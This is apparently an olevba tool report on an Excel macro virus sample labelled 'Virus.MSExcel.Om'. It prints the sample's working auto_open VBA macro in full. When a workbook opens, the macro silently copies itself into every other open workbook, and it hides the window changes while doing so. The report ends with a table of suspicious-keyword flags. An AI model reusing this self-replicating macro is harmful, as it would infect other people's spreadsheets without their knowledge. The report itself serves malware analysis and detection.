olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Om-a52102588d2ef7cc29605e761b203ac5e6f0101d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Om-a52102588d2ef7cc29605e761b203ac5e6f0101d - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Om-a52102588d2ef7cc29605e761b203ac5e6f0101d - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Om-a52102588d2ef7cc29605e761b203ac5e6f0101d - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Om-a52102588d2ef7cc29605e761b203ac5e6f0101d - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Om-a52102588d2ef7cc29605e761b203ac5e6f0101d - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Om-a52102588d2ef7cc29605e761b203ac5e6f0101d - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSExcel.Om-a52102588d2ef7cc29605e761b203ac5e6f0101d - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO OMMacro.bas 
in file: Virus.MSExcel.Om-a52102588d2ef7cc29605e761b203ac5e6f0101d - OLE stream: '_VBA_PROJECT_CUR/VBA/OMMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 







Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
For Each classeur In Application.Workbooks
If classeur.Name <> "OM.XLS" Then
    om = False
    For Each Feuille In classeur.Sheets
        If Feuille.Name = "OMMacro" Then om = True
    Next Feuille
    If Not om Then
    apparent = Windows(classeur.Name).Visible
    Windows(classeur.Name).Visible = True
    ThisWorkbook.Modules("OMMacro").Copy after:=Workbooks(classeur.Name).Sheets(1)
    Windows(classeur.Name).Visible = apparent
    End If 'om
End If
Next classeur

End Sub


-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  OMMacr
' 0085     14 BOUNDSHEET : Sheet Information - 20, reserved bits not zero: 0x20 visible -        
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

